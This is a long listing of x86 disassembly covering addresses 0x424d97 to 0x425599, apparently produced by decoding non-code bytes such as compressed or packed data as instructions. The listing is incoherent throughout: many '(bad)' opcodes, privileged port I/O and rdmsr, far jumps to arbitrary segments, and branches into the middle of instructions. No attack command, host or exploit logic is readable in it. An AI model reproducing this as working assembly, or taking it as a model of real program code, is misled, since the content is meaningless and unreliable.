  424d97:	test   BYTE PTR [edx-0x66],ch
  424d9a:	adc    ebx,edi
  424d9c:	fdivp  st(4),st
  424d9e:	or     al,0x9f
  424da0:	pop    edi
  424da1:	fucom  st(3)
  424da3:	add    eax,0x6cee91f1
  424da8:	adc    ebp,edx
  424daa:	cmp    eax,0x1549b45b
  424daf:	fwait
  424db0:	(bad)  
  424db1:	out    dx,al
  424db2:	adc    DWORD PTR [esi],edi
  424db4:	jp     0x424dab
  424db6:	jo     0x424d9a
  424db8:	mov    DWORD PTR [edx+0x1d],esp
  424dbb:	cmp    BYTE PTR [ebx+0x0],cl
  424dbe:	sti    
  424dbf:	cmp    al,0x78
  424dc1:	or     al,0xd4
  424dc3:	mov    edx,0x0
	...
  424dd0:	add    BYTE PTR [esi-0x42494e3],cl
  424dd6:	(bad)  
  424dd7:	mov    esi,0x726f765d
  424ddc:	xor    al,bl
  424dde:	jne    0x424e17
  424de0:	adc    eax,0x1c51f
  424de5:	stos   DWORD PTR es:[edi],eax
  424de6:	add    eax,DWORD PTR [eax]
  424de8:	add    cl,dh
  424dea:	or     al,0x9f
  424dec:	sub    eax,0xfd6ff380
  424df1:	je     0x424e14
  424df3:	pop    edi
  424df4:	push   ss
  424df5:	fs out dx,al
  424df7:	jg     0x424dd8
  424df9:	xchg   DWORD PTR [esi-0x6a11b34a],ebp
  424dff:	jmp    DWORD PTR [ebp-0x73]
  424e02:	(bad)  
  424e03:	aad    0xd4
  424e05:	rcl    DWORD PTR [ebp-0x72],0xf9
  424e09:	inc    edx
  424e0a:	xlat   BYTE PTR ds:[ebx]
  424e0b:	ja     0x424e3b
  424e0d:	ret    0x6b77
  424e10:	loopne 0x424e5e
  424e12:	fcmovu st,st(6)
  424e14:	adc    edi,DWORD PTR [eax+0x7f175dcf]
  424e1a:	sbb    bh,BYTE PTR [ecx+esi*8-0x6]
  424e1e:	jae    0x424e2a
  424e20:	jmp    0x2973:0xf64558be
  424e27:	mov    ecx,0x4efe1f08
  424e2c:	add    DWORD PTR [edi-0x6b],ebp
  424e2f:	cmp    eax,0x243ea8eb
  424e34:	ins    BYTE PTR es:[edi],dx
  424e35:	push   eax
  424e36:	jno    0x424eb2
  424e38:	sbb    al,0x42
  424e3a:	cmp    al,0xe0
  424e3c:	and    eax,0x94d15ee9
  424e41:	mov    WORD PTR [ecx+eiz*4],gs
  424e44:	add    ebp,DWORD PTR [esi-0x5a]
  424e47:	div    DWORD PTR [ebx-0x4481562e]
  424e4d:	(bad)  
  424e4e:	in     al,0x8e
  424e50:	test   eax,0x2c3bf672
  424e55:	stos   DWORD PTR es:[edi],eax
  424e56:	clc    
  424e57:	dec    ebp
  424e58:	dec    edx
  424e59:	loopne 0x424e08
  424e5b:	add    DWORD PTR [ebp+0x31901443],edx
  424e61:	jo     0x424ebc
  424e63:	rcl    BYTE PTR ds:0xf6eb36ba,0xe0
  424e6a:	int    0x31
  424e6c:	pop    edx
  424e6d:	inc    edi
  424e6e:	pushf  
  424e6f:	aaa    
  424e70:	dec    edi
  424e71:	and    ecx,DWORD PTR [ebx]
  424e73:	pusha  
  424e74:	pop    edi
  424e75:	(bad)  
  424e77:	dec    esp
  424e78:	ds pop ss
  424e7a:	push   ebx
  424e7b:	cmc    
  424e7c:	pop    ss
  424e7d:	jmp    0x424e7b
  424e7f:	test   ch,dh
  424e81:	into   
  424e82:	test   DWORD PTR [edi-0x3a332f03],ecx
  424e88:	jmp    0xa32669a3
  424e8d:	daa    
  424e8e:	mov    dh,0xa1
  424e90:	jle    0x424e8b
  424e92:	mov    bl,0x82
  424e94:	mov    esp,0x3d0ee77c
  424e99:	cmp    al,0x89
  424e9b:	push   esp
  424e9c:	jmp    0xa3657910
  424ea1:	gs cwde 
  424ea3:	add    ah,BYTE PTR [esi+0x5a]
  424ea6:	js     0x424e8f
  424ea8:	or     al,ch
  424eaa:	jg     0x424eba
  424eac:	pop    edi
  424ead:	pop    ss
  424eae:	out    dx,eax
  424eaf:	into   
  424eb0:	ret    0x7ccc
  424eb3:	mov    al,ds:0x1d66a42a
  424eb8:	ss dec esi
  424eba:	arpl   WORD PTR [edi+ecx*2+0x7a],bx
  424ebe:	or     al,0xbe
  424ec0:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ec2:	or     BYTE PTR [esi-0x26c5e6fd],ah
  424ec8:	and    cl,BYTE PTR [edi+esi*2+0x46]
  424ecc:	scas   eax,DWORD PTR es:[edi]
  424ecd:	dec    ecx
  424ece:	jae    0x424ed0
  424ed0:	std    
  424ed1:	cmp    al,0xfb
  424ed3:	pop    es
  424ed4:	idiv   BYTE PTR [esi]
  424ed6:	cdq    
  424ed7:	(bad)  
  424ed8:	jg     0x424ec3
  424eda:	ficom  WORD PTR [ebx]
  424edc:	outs   dx,BYTE PTR ds:[esi]
  424edd:	inc    ebx
  424ede:	repz adc al,0x8
  424ee1:	push   ds
  424ee2:	retf   0x5476
  424ee5:	cmp    al,0xaa
  424ee7:	jecxz  0x424f0d
  424ee9:	ss xchg ebx,eax
  424eeb:	or     esp,esi
  424eed:	push   cs
  424eee:	ret    
  424eef:	or     dh,0xca
  424ef2:	jae    0x424f55
  424ef4:	cmp    BYTE PTR [ecx-0x65f53df8],al
  424efa:	lea    esi,[ebp-0x59228ee2]
  424f00:	cmpxchg BYTE PTR ds:0x7db535e2,ah
  424f07:	push   eax
  424f08:	lahf   
  424f09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f0a:	bound  edi,QWORD PTR [edi]
  424f0c:	repnz mov ss,esi
  424f0f:	shl    BYTE PTR [ebx+0x48bcd91],0x56
  424f16:	fyl2xp1 
  424f18:	mov    edi,0xb6bdbf62
  424f1d:	fld    DWORD PTR [ebp+0x7173d319]
  424f23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f24:	(bad)  
  424f26:	xor    eax,0xdfd958f
  424f2b:	push   ss
  424f2c:	push   edx
  424f2d:	xchg   ebp,eax
  424f2e:	pop    edx
  424f2f:	out    0x87,eax
  424f31:	sbb    al,0x6c
  424f33:	shr    ebp,1
  424f35:	xor    edi,ebx
  424f37:	jg     0x424eda
  424f39:	ins    DWORD PTR es:[edi],dx
  424f3a:	sar    BYTE PTR [ecx],1
  424f3c:	inc    eax
  424f3d:	pop    edi
  424f3e:	out    dx,al
  424f3f:	sub    eax,0x47a00dbf
  424f44:	ror    DWORD PTR [ecx-0x30],cl
  424f47:	mov    ?,WORD PTR [esi-0x23]
  424f4a:	lahf   
  424f4b:	test   eax,0x47067302
  424f50:	and    esp,DWORD PTR [ebx+0x3e2e9beb]
  424f56:	sub    esi,DWORD PTR ds:0x7a35909e
  424f5c:	retf   
  424f5d:	es xchg edx,eax
  424f5f:	sti    
  424f60:	sbb    ebp,DWORD PTR [ebp-0x50]
  424f63:	sbb    BYTE PTR [ebx+0x7731d6ca],bh
  424f69:	lock sbb esi,DWORD PTR [esi+0x5bc7cd5f]
  424f70:	bound  edx,QWORD PTR [edi+0x4f]
  424f73:	add    al,0x5b
  424f75:	out    0xfd,al
  424f77:	ds push es
  424f79:	mov    dl,0x1e
  424f7b:	push   ecx
  424f7c:	xchg   esi,eax
  424f7d:	retf   
  424f7e:	popa   
  424f7f:	lock neg BYTE PTR [ecx+0x6f87d51e]
  424f86:	dec    edi
  424f87:	pop    esi
  424f88:	mov    al,0xc5
  424f8a:	mov    BYTE PTR [edx],bh
  424f8c:	mov    ecx,0x136e52ef
  424f91:	push   esi
  424f92:	call   0x92e5:0xa77bb7c7
  424f99:	cs xchg ecx,eax
  424f9b:	shr    BYTE PTR [eax],cl
  424f9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f9e:	xchg   edx,eax
  424f9f:	addr16 mov edx,0x191a97b1
  424fa5:	gs enter 0xd6c7,0x11
  424faa:	stc    
  424fab:	xchg   ecx,eax
  424fac:	xchg   BYTE PTR [eax+0xf],bl
  424faf:	jmp    0xee94840b
  424fb4:	je     0x424f38
  424fb6:	fucompp 
  424fb8:	scas   al,BYTE PTR es:[edi]
  424fb9:	pop    eax
  424fba:	(bad)  
  424fbb:	jg     0x424f65
  424fbd:	push   0xd9f736da
  424fc2:	lahf   
  424fc3:	scas   al,BYTE PTR es:[edi]
  424fc4:	and    ecx,esi
  424fc6:	arpl   WORD PTR [edx-0x7ddba826],si
  424fcc:	and    BYTE PTR [ebx-0x13],bh
  424fcf:	cmp    edx,ebx
  424fd1:	test   ecx,esi
  424fd3:	sar    BYTE PTR [esi-0x62],cl
  424fd6:	psrad  mm5,QWORD PTR [edi-0x46939f72]
  424fdd:	cdq    
  424fde:	cmp    BYTE PTR [edx],al
  424fe0:	scas   eax,DWORD PTR es:[edi]
  424fe1:	dec    esi
  424fe2:	pop    es
  424fe3:	jb     0x424fc2
  424fe5:	jle    0x424f87
  424fe7:	add    al,BYTE PTR [edx+0x3e]
  424fea:	mov    ds:0xa4d208c8,al
  424fef:	in     al,dx
  424ff0:	std    
  424ff1:	or     ebx,DWORD PTR [edi-0x2936a618]
  424ff7:	inc    eax
  424ff8:	adc    cl,BYTE PTR [ecx+ebx*1]
  424ffb:	pop    es
  424ffc:	call   0xacc1:0x9c2eaee5
  425003:	loop   0x42507d
  425005:	jg     0x425085
  425007:	out    dx,al
  425008:	inc    esp
  425009:	rcr    BYTE PTR ds:0x20f10b9f,1
  42500f:	and    edx,DWORD PTR [esi+eax*2-0x196399ec]
  425016:	(bad)  
  425017:	and    eax,esi
  425019:	std    
  42501a:	push   es
  42501b:	loopne 0x424f9e
  42501d:	sub    ch,dl
  42501f:	call   0xde5d4da0
  425024:	ret    0x872c
  425027:	inc    ebp
  425028:	mov    cl,0x0
  42502a:	xchg   ebx,eax
  42502b:	lods   eax,DWORD PTR ds:[esi]
  42502c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42502d:	(bad)  
  42502e:	in     al,dx
  42502f:	leave  
  425030:	xchg   ebx,eax
  425031:	mov    ds:0x66b59cf2,al
  425036:	adc    BYTE PTR ds:0x12cdaa0d,0x75
  42503d:	inc    esp
  42503e:	mov    al,0x21
  425040:	jne    0x425068
  425042:	ins    DWORD PTR es:[edi],dx
  425043:	jmp    0x425080
  425045:	dec    ecx
  425046:	bnd ja 0x42500f
  425049:	cli    
  42504a:	jnp    0x424fe9
  42504c:	dec    edi
  42504d:	pop    ebp
  42504e:	push   0x384be1f
  425053:	fwait
  425054:	xor    eax,0x239bfa8c
  425059:	adc    BYTE PTR [eax],0x9a
  42505c:	xor    ch,BYTE PTR [esi]
  42505e:	pop    eax
  42505f:	cwde   
  425060:	cwde   
  425061:	loopne 0x425033
  425063:	stc    
  425064:	or     DWORD PTR [ecx-0xa],edi
  425067:	pusha  
  425068:	aam    0x21
  42506a:	mov    esp,DWORD PTR [edi+0x6f]
  42506d:	sbb    BYTE PTR [ebp-0x44309e79],bh
  425073:	mov    edi,0xbb09aa6d
  425078:	or     esi,DWORD PTR [esi]
  42507a:	mov    WORD PTR [edx-0x72],ds
  42507d:	jle    0x425041
  42507f:	jmp    0x8380:0x984f4132
  425086:	adc    DWORD PTR [esp+eax*8-0x32],0xffffff9c
  42508b:	xchg   ebp,eax
  42508c:	fcmove st,st(2)
  42508e:	pop    esp
  42508f:	xor    bh,dl
  425091:	inc    ebp
  425092:	pop    edi
  425093:	pop    esi
  425094:	adc    bh,BYTE PTR [eax]
  425096:	aad    0x43
  425098:	arpl   WORD PTR [ecx+0x7cdd48f2],cx
  42509e:	fidivr WORD PTR [esi]
  4250a0:	sub    BYTE PTR [esi+0x13],cl
  4250a3:	add    eax,0x5853f4ac
  4250a8:	mov    esi,ds
  4250aa:	push   ds
  4250ab:	adc    BYTE PTR [ebx],dl
  4250ad:	mov    bh,0x9c
  4250af:	je     0x425041
  4250b1:	repz sar BYTE PTR [edx+0x6095437b],0x41
  4250b9:	data16 mov al,0x2a
  4250bc:	adc    al,0x4a
  4250be:	mov    dl,0x2a
  4250c0:	cmp    DWORD PTR [ebp+eiz*8-0x61a65b0d],edx
  4250c7:	addr16 and eax,0xde34ae5b
  4250cd:	inc    eax
  4250ce:	cwde   
  4250cf:	cdq    
  4250d0:	ret    0xec6d
  4250d3:	fcmovnu st,st(2)
  4250d5:	daa    
  4250d6:	loop   0x4250c5
  4250d8:	pop    ebx
  4250d9:	repnz xchg edi,eax
  4250db:	or     eax,0x258c526e
  4250e0:	aad    0x7b
  4250e2:	xchg   ecx,ebp
  4250e4:	inc    edi
  4250e5:	cmp    al,0x61
  4250e7:	jbe    0x425168
  4250e9:	out    0x75,eax
  4250eb:	xor    ecx,DWORD PTR [esi+0x6d]
  4250ee:	test   DWORD PTR [ebx],esi
  4250f0:	push   eax
  4250f1:	and    DWORD PTR [edx+0xe],ecx
  4250f4:	jp     0x42515a
  4250f6:	out    dx,eax
  4250f7:	mov    ds:0x75904448,al
  4250fc:	push   ds
  4250fd:	sbb    eax,0xd1d0715e
  425102:	scas   eax,DWORD PTR es:[edi]
  425103:	test   eax,0xc4a8014b
  425109:	push   cs
  42510a:	inc    ebx
  42510b:	xchg   DWORD PTR [eax-0x6],esp
  42510e:	fisubr DWORD PTR ds:0xb03ed388
  425114:	sub    edi,DWORD PTR [eax]
  425116:	sub    eax,0x129239de
  42511b:	push   edx
  42511c:	sbb    bl,BYTE PTR [esi+0x62789c14]
  425122:	pop    ebp
  425123:	cwde   
  425124:	pop    es
  425125:	retf   0xe817
  425128:	push   ss
  425129:	test   BYTE PTR [ebp+0x34],bl
  42512c:	sub    ecx,DWORD PTR [ecx-0x72]
  42512f:	jo     0x425185
  425131:	inc    esp
  425132:	outs   dx,BYTE PTR ds:[esi]
  425133:	jne    0x425127
  425135:	int3   
  425136:	mov    eax,0x91747b8e
  42513b:	adc    ecx,DWORD PTR [ecx]
  42513d:	and    BYTE PTR [esi-0x63],al
  425140:	scas   eax,DWORD PTR es:[edi]
  425141:	push   esp
  425142:	test   eax,0xa083f3e9
  425147:	and    dh,BYTE PTR [eax]
  425149:	inc    esi
  42514a:	sub    eax,0x38e9b9fa
  42514f:	mov    fs,WORD PTR [edx+0x17]
  425152:	dec    eax
  425153:	xchg   esi,eax
  425154:	pop    ss
  425155:	sbb    eax,0x249da499
  42515a:	ret    0x6f6e
  42515d:	ds inc ebx
  42515f:	les    edi,FWORD PTR [edx-0x4b]
  425162:	out    0x29,al
  425164:	sub    eax,0x88779346
  425169:	inc    ecx
  42516a:	push   cs
  42516b:	mov    ds:0x34074ac8,eax
  425170:	or     al,0x35
  425172:	xchg   DWORD PTR [ebp-0x1bf29420],edx
  425178:	fwait
  425179:	dec    edx
  42517a:	test   eax,0x6480ce00
  42517f:	pop    edi
  425180:	push   ebx
  425181:	clc    
  425182:	iret   
  425183:	repnz push edx
  425185:	pop    esp
  425186:	aaa    
  425187:	test   eax,0xd95c3713
  42518c:	add    al,0x2a
  42518e:	and    eax,0xef633746
	...
  4251a0:	add    BYTE PTR [ecx-0x42],ch
  4251a3:	cmp    esi,DWORD PTR [esi-0x124801]
  4251a9:	jnp    0x4251f5
  4251ab:	dec    ecx
  4251ac:	pop    ecx
  4251ad:	iret   
  4251ae:	es or  al,0x37
  4251b1:	retf   0x1c8
  4251b4:	add    BYTE PTR [ebx-0x6fffffd],ch
  4251ba:	sbb    eax,0x56fe47a
  4251bf:	cmp    eax,0xd9356011
  4251c4:	cwde   
  4251c5:	cmp    BYTE PTR [esi-0x4],0x83
  4251c9:	cld    
  4251ca:	inc    ecx
  4251cb:	jbe    0x4251f8
  4251cd:	sbb    DWORD PTR [esi+0x5b21049d],esi
  4251d3:	imul   ah
  4251d5:	jb     0x425240
  4251d7:	inc    esi
  4251d8:	inc    edx
  4251d9:	cmp    BYTE PTR [bp+si],cl
  4251dc:	mov    dl,0x4c
  4251de:	cs pop esp
  4251e0:	adc    DWORD PTR [ebx-0x7760a644],ebp
  4251e6:	and    DWORD PTR [ecx+0x2ed5b5c4],ebp
  4251ec:	sub    BYTE PTR [ebx],bl
  4251ee:	or     DWORD PTR [edx-0x31153eac],esp
  4251f4:	ja     0x4251c6
  4251f6:	push   ecx
  4251f7:	jmp    0x425189
  4251f9:	enter  0xe391,0x66
  4251fd:	and    edi,ebp
  4251ff:	retf   
  425200:	push   esi
  425201:	jge    0x4251c9
  425203:	or     eax,0x14e01a8a
  425208:	in     al,dx
  425209:	xor    esi,DWORD PTR [ebx+0x7c]
  42520c:	mov    esi,0xaae0c5d4
  425211:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425212:	imul   esi,DWORD PTR [esi],0x2a4916ab
  425218:	shl    DWORD PTR [ebp+0x2f76702a],0xba
  42521f:	fldenv [edi+0x24e4061a]
  425225:	inc    edx
  425226:	xchg   esi,eax
  425227:	adc    DWORD PTR [edi+0x6313eeed],esi
  42522d:	pop    eax
  42522e:	outs   dx,BYTE PTR ds:[esi]
  42522f:	pop    ebp
  425230:	sbb    BYTE PTR [edx],cl
  425232:	ds cmp ecx,esi
  425235:	in     al,dx
  425236:	pushf  
  425237:	stc    
  425238:	(bad)  
  425239:	mov    edi,0x6e6eb83d
  42523e:	out    dx,eax
  42523f:	pop    eax
  425240:	mov    ds:0x26ca4d45,eax
  425245:	dec    ebp
  425246:	pop    ds
  425247:	lds    ecx,FWORD PTR [edx]
  425249:	int3   
  42524a:	dec    ebp
  42524b:	or     eax,0xdada68d3
  425250:	in     eax,0xfd
  425252:	adc    DWORD PTR [esi+0x56],0xffffffed
  425256:	push   ebx
  425257:	and    DWORD PTR [eax-0x12],ebp
  42525a:	out    dx,al
  42525b:	test   DWORD PTR [edi+0xa],eax
  42525e:	push   es
  42525f:	pop    esi
  425260:	push   eax
  425261:	adc    BYTE PTR [edi+0x134c03a7],al
  425267:	sar    BYTE PTR [ebx-0x4d88b6c5],0xe8
  42526e:	loopne 0x42529e
  425270:	(bad)  
  425272:	mov    eax,0x17d3e38d
  425277:	ret    
  425278:	test   BYTE PTR [edi+0xff5e0eb],0xba
  42527f:	inc    ebx
  425280:	lods   al,BYTE PTR ds:[esi]
  425281:	ret    
  425282:	push   esp
  425283:	mov    al,0x4a
  425285:	idiv   BYTE PTR [ebx+0x20]
  425288:	xchg   ebp,eax
  425289:	inc    esi
  42528a:	fwait
  42528b:	jmp    0x69b6:0x37f97494
  425292:	mov    al,0x96
  425294:	sub    eax,0x746f2608
  425299:	(bad)  
  42529a:	ja     0x4252cb
  42529c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42529d:	jo     0x4252f9
  42529f:	arpl   WORD PTR fs:[eax],bx
  4252a2:	lock shl cl,0xaa
  4252a6:	inc    eax
  4252a7:	xchg   cl,cl
  4252a9:	xchg   ebp,eax
  4252aa:	inc    esp
  4252ab:	imul   edx,DWORD PTR [ecx-0x42],0xffffffa1
  4252af:	aaa    
  4252b0:	jnp    0x4252a3
  4252b2:	push   edi
  4252b3:	jae    0x4252b4
  4252b5:	fimul  DWORD PTR [ebp-0x3b99faa4]
  4252bb:	dec    eax
  4252bc:	cs mov ecx,esi
  4252bf:	sub    dl,ah
  4252c1:	jbe    0x4252fd
  4252c3:	mov    dh,0x6b
  4252c5:	es sub ebp,esi
  4252c8:	pushf  
  4252c9:	pop    eax
  4252ca:	mov    bl,0x53
  4252cc:	xor    DWORD PTR [esi+0x4f],ecx
  4252cf:	adc    al,0x89
  4252d1:	aam    0x67
  4252d3:	lahf   
  4252d4:	sahf   
  4252d5:	pop    ebp
  4252d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4252d7:	sbb    dl,bl
  4252d9:	fidiv  DWORD PTR [edi-0x29]
  4252dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4252dd:	adc    DWORD PTR [ebx-0x50433581],0x3c59aa25
  4252e7:	inc    esi
  4252e8:	mov    al,ds:0x54509cd2
  4252ed:	add    al,0x8e
  4252ef:	pop    es
  4252f0:	push   ebp
  4252f1:	sbb    DWORD PTR fs:[ebx+0x2f9d45c0],edi
  4252f8:	pop    ebp
  4252f9:	jae    0x425313
  4252fb:	les    ebx,FWORD PTR [ebx+0x64a36372]
  425301:	xchg   ebx,edi
  425303:	int    0x54
  425305:	adc    BYTE PTR [eax+0x79efa791],bl
  42530b:	jae    0x42532c
  42530d:	pop    esp
  42530e:	sbb    dh,BYTE PTR [edi-0x7a001dde]
  425314:	pop    esi
  425315:	outs   dx,BYTE PTR ds:[esi]
  425316:	sub    al,0x47
  425318:	xchg   esp,eax
  425319:	out    dx,al
  42531a:	retf   0x1166
  42531d:	rcl    DWORD PTR [edi],1
  42531f:	and    DWORD PTR [eax+edx*4+0xc],esi
  425323:	popf   
  425324:	push   esi
  425325:	(bad)  [esi]
  425327:	in     al,0x81
  425329:	adc    ebp,DWORD PTR [ebp-0x15870440]
  42532f:	loop   0x4252c3
  425331:	add    BYTE PTR [esi],ah
  425333:	mov    esi,0x663912ed
  425338:	mov    ah,0x75
  42533a:	cmp    cl,al
  42533c:	jbe    0x425369
  42533e:	(bad)  [esi+edi*4]
  425341:	sub    eax,0x4d6b1f61
  425346:	mov    dh,0x9a
  425348:	rdmsr  
  42534a:	xchg   edx,eax
  42534b:	cmp    DWORD PTR [eax],esp
  42534d:	fisub  WORD PTR [ebx]
  42534f:	jge    0x425308
  425351:	jecxz  0x425305
  425353:	sbb    eax,0x947147dc
  425358:	push   edx
  425359:	shl    DWORD PTR [edx],1
  42535b:	sbb    BYTE PTR [edx+0x19de5747],dh
  425361:	psllw  mm6,QWORD PTR [edi]
  425364:	jmp    0x425363
  425366:	xchg   edi,eax
  425367:	xchg   ebp,eax
  425368:	ins    DWORD PTR es:[edi],dx
  425369:	imul   ebx,DWORD PTR [ebx],0xffffffc7
  42536c:	mov    esi,0xa762285b
  425371:	mov    al,ds:0xc18e82ab
  425376:	sbb    al,0x2a
  425378:	pop    es
  425379:	mov    esp,0x9e8a2107
  42537e:	ffree  st(4)
  425380:	add    ebp,DWORD PTR [esi]
  425382:	add    BYTE PTR [ebx+0x55],ch
  425385:	inc    ebp
  425386:	enter  0xc543,0x62
  42538a:	in     eax,0xc1
  42538c:	xor    BYTE PTR [edi],al
  42538e:	les    ecx,FWORD PTR [ebx+0x45]
  425391:	xlat   BYTE PTR ds:[ebx]
  425392:	test   edx,ecx
  425394:	pop    edi
  425395:	mov    ch,0xe3
  425397:	sub    esp,DWORD PTR [eax]
  425399:	and    DWORD PTR [ecx+0x651a2345],ebp
  42539f:	test   DWORD PTR [edx-0x541f222f],esi
  4253a5:	(bad)  
  4253a6:	jmp    DWORD PTR [ecx+0x2e]
  4253a9:	adc    ch,BYTE PTR [eax+0x42]
  4253ac:	add    DWORD PTR [ecx+0x17],esi
  4253af:	mov    edx,0xeaab3fe
  4253b4:	jbe    0x4253dd
  4253b6:	dec    ebx
  4253b7:	cmp    DWORD PTR ds:0xdc3042e1,edi
  4253bd:	je     0x4253ca
  4253bf:	ds call 0x93e6a415
  4253c5:	leave  
  4253c6:	pop    esi
  4253c7:	call   0x82d5becc
  4253cc:	sub    BYTE PTR [edx],ch
  4253ce:	mov    cl,0x7
  4253d0:	push   0x42937305
  4253d5:	scas   eax,DWORD PTR es:[edi]
  4253d6:	pop    esp
  4253d7:	repz out dx,al
  4253d9:	repz in eax,0x9b
  4253dc:	adc    dl,BYTE PTR [esi+0x3f]
  4253df:	mov    ds:0xd5558b9d,al
  4253e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4253e5:	pop    ds
  4253e6:	jnp    0x4253ef
  4253e8:	or     dh,dh
  4253ea:	outs   dx,DWORD PTR ds:[esi]
  4253eb:	int3   
  4253ec:	scas   eax,DWORD PTR es:[edi]
  4253ed:	fisttp DWORD PTR [eax]
  4253ef:	inc    eax
  4253f0:	or     esp,DWORD PTR [edi-0x70e078]
  4253f6:	adc    eax,0x88edce28
  4253fb:	push   ebx
  4253fc:	and    eax,0x64c62252
  425401:	out    0x93,eax
  425403:	js     0x42543f
  425405:	sbb    esi,0xffffffa7
  425408:	leave  
  425409:	push   ebx
  42540a:	mov    edi,0xe89d1ceb
  42540f:	pop    edi
  425410:	push   edi
  425411:	pop    eax
  425412:	frstor ds:0xc75e6748
  425418:	jg     0x425497
  42541a:	sub    eax,0x6b4432ee
  42541f:	popf   
  425420:	ins    DWORD PTR es:[edi],dx
  425421:	adc    DWORD PTR [edi+0x1d],ebx
  425424:	(bad)  
  425425:	stos   BYTE PTR es:[edi],al
  425426:	pop    ebx
  425427:	imul   esp,DWORD PTR [edx],0x4a
  42542a:	push   esi
  42542b:	es loope 0x4253c0
  42542e:	jmp    0x4253f3
  425430:	sub    edi,DWORD PTR [edi-0x5147dee6]
  425436:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425437:	mov    ecx,0x89c5c91e
  42543c:	adc    eax,0xc3818ac4
  425441:	or     BYTE PTR [ecx+0x1b],dl
  425444:	out    0x47,al
  425446:	aad    0x31
  425448:	mov    esi,0xdd8babe0
  42544d:	mov    ecx,0x9765a34
  425452:	and    al,0x79
  425454:	add    eax,0xbab91b50
  425459:	push   ebx
  42545a:	xchg   edx,eax
  42545b:	fadd   DWORD PTR [ecx*8+0x28444c06]
  425462:	stc    
  425463:	cwde   
  425464:	jbe    0x42542a
  425466:	inc    eax
  425467:	sbb    al,0x14
  425469:	cld    
  42546a:	pop    ds
  42546b:	inc    edi
  42546c:	ficom  WORD PTR [ebp-0x14]
  42546f:	and    dl,ah
  425471:	jb     0x42543d
  425473:	aaa    
  425474:	arpl   WORD PTR [esi-0x6cb07ece],cx
  42547a:	das    
  42547b:	js     0x42542c
  42547d:	xor    bl,dl
  42547f:	add    edx,esp
  425481:	adc    DWORD PTR [eax+0x38],0x54
  425485:	iret   
  425486:	add    bh,BYTE PTR [si+0x2c]
  42548a:	cmp    BYTE PTR [ebx+0x183fc08],0x16
  425491:	call   0x45f9:0x3e248407
  425498:	adc    dh,bl
  42549a:	pop    ecx
  42549b:	mov    ebp,0xec158a16
  4254a0:	test   eax,0xcbf41f12
  4254a5:	push   edi
  4254a6:	push   esp
  4254a7:	mov    bl,0x70
  4254a9:	outs   dx,BYTE PTR ds:[esi]
  4254aa:	call   0x8049fa30
  4254af:	jno    0x42549d
  4254b1:	mov    eax,ebp
  4254b3:	sub    al,0x93
  4254b5:	or     eax,0xb69add6c
  4254ba:	push   edi
  4254bb:	sub    eax,0x6256521e
  4254c0:	test   BYTE PTR [ecx+ebp*4+0x1c8ab441],0x3e
  4254c8:	mov    DWORD PTR [edx+0x46],edx
  4254cb:	dec    eax
  4254cc:	xchg   ebp,eax
  4254cd:	fcom   QWORD PTR [esi-0x224742c8]
  4254d3:	(bad)  
  4254d5:	sub    al,0xb2
  4254d7:	dec    ebx
  4254d8:	lods   al,BYTE PTR ds:[esi]
  4254d9:	pop    edi
  4254da:	sub    al,0x4c
  4254dc:	mov    cl,0xb1
  4254de:	mov    edx,0x27438e04
  4254e3:	add    DWORD PTR ds:0xde49b94c,edx
  4254e9:	mov    dh,0xed
  4254eb:	inc    ecx
  4254ec:	lahf   
  4254ed:	and    DWORD PTR [esi],edx
  4254ef:	leave  
  4254f0:	test   BYTE PTR [esi-0x22],cl
  4254f3:	cmp    al,0x54
  4254f5:	stc    
  4254f6:	jmp    0x67d61453
  4254fb:	stos   BYTE PTR es:[edi],al
  4254fc:	loopne 0x425526
  4254fe:	out    0x94,al
  425500:	cdq    
  425501:	cmc    
  425502:	mov    al,0xf9
  425504:	push   ebx
  425505:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425506:	pushf  
  425507:	outs   dx,DWORD PTR ds:[esi]
  425508:	iret   
  425509:	sahf   
  42550a:	adc    bh,BYTE PTR [ebx+0x171e6ea]
  425510:	and    ah,BYTE PTR [ebp-0x7e]
  425513:	mov    al,BYTE PTR [ecx-0x4]
  425516:	arpl   WORD PTR [edx-0x13858e4a],dx
  42551c:	loope  0x4254de
  42551e:	aaa    
  42551f:	mov    dl,0x58
  425521:	dec    ecx
  425522:	or     eax,DWORD PTR [edx-0x6f]
  425525:	ins    BYTE PTR es:[edi],dx
  425526:	ret    
  425527:	lds    ebp,FWORD PTR [ebp-0x93b6fa1]
  42552d:	jns    0x425519
  42552f:	(bad)  
  425530:	cld    
  425531:	popa   
  425532:	rol    eax,1
  425534:	pushf  
  425535:	sub    cl,ah
  425537:	mov    ds:0x5dcbd096,al
  42553c:	push   ds
  42553d:	or     BYTE PTR [edi-0x5],dh
  425540:	mov    WORD PTR ds:[edx+0x2b],fs
  425544:	mov    ebp,DWORD PTR [ebx-0x18]
  425547:	pop    eax
  425548:	dec    edi
  425549:	xor    al,0x7c
  42554b:	push   0x1da2f614
  425550:	(bad)  
  425551:	je     0x425520
  425553:	loopne 0x425531
  425555:	adc    ah,dh
  425557:	cmp    eax,0xcf63c726
  42555c:	dec    esi
  42555d:	int3   
  42555e:	loope  0x4254ec
  425560:	dec    ebx
  425561:	push   esp
  425562:	xchg   ebp,eax
  425563:	sub    al,0x0
	...
  425571:	jmp    0x4255bb
  425573:	or     al,0xc7
  425575:	scas   eax,DWORD PTR es:[edi]
  425576:	(bad)  
  425577:	jmp    0x4255e5
  425579:	popa   
  42557a:	mov    cl,ch
  42557c:	or     esp,DWORD PTR [esp]
  42557f:	shl    BYTE PTR [ecx+0x1cc75],cl
  425585:	stos   DWORD PTR es:[edi],eax
  425586:	add    eax,DWORD PTR [eax]
  425588:	add    dh,ch
  42558a:	mov    dl,0x5a
  42558c:	dec    esp
  42558d:	sbb    BYTE PTR [esi+0x6c290242],0xcf
  425594:	pop    eax
  425595:	fs pop es
  425597:	xchg   BYTE PTR [eax],ch
  425599:	push   esi
